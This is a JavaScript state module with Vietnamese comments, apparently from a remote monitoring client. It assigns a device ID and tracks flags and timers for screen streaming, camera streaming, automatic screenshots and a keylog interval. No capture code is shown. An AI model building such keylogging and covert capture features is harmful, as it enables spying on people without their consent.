// modules/store.js (NANG CAP: Tao Device ID)
// File nay chua cac bien "toan cuc" (state) cua ung dung

const urlParams = new URLSearchParams(window.location.search);
const importedId = urlParams.get("importedId"); // Lấy ID từ Launcher gửi sang

let storedId = localStorage.getItem("device_id");

// Nếu có ID từ Launcher và nó khác ID hiện tại -> Cập nhật luôn
if (importedId && importedId !== storedId) {
  storedId = importedId;
  localStorage.setItem("device_id", storedId);
}

// Logic tạo mới nếu chưa có (như cũ)
if (!storedId) {
  storedId = "CL_" + Math.random().toString(36).substr(2, 4);
  localStorage.setItem("device_id", storedId);
}
// ------------------------------

// 'store' la mot object dung chung
export const store = {
  db: null, // Doi tuong IndexedDB

  DEVICE_ID: storedId, // Ma dinh danh cua client nay
  clientIP: null,

  socketReady: false,

  // Bien de theo doi trang thai stream
  isScreenStreamOn: false,
  isCamStreamOn: false,

  // Bien luu bo dem thoi gian
  autoShotInt: null,
  keylogInt: null,

  // Bien cho chuc nang chup anh
  isSavingScreenshot: false,
};
